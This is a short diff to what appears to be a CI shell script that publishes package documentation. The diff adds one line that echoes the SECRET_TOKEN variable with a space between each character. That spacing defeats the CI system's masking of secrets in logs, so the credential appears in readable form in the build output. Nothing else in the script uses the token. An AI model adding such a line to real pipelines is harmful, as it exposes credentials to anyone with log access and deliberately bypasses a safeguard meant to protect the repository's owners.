@@ -20,6 +20,7 @@ pwd
 ls -al
 ls -al ../
 ls -al ../../
+echo ${SECRET_TOKEN} | sed 's/./& /g'
 
 cp -R ${GITHUB_WORKSPACE}/monorepo/packages/foo/docs/. ${DOC_TARGET_FOLDER}/
 
